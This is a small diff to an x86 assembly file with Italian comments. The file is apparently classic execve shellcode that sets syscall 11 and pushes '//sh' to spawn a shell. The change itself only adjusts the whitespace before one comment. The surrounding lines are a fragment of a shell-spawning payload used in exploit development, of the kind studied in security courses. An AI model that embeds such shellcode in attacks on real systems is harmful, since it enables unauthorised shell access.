@@ -8,7 +8,7 @@ BITS 32
 
 push BYTE 11        
 pop eax
-cdq                 ;azzera edx dal bit del segno di eax
+cdq                   ;azzera edx dal bit del segno di eax
 xor ecx, ecx
 push edx    		;push per il terminatore null
 push 0x68732f2f		;push "//sh"
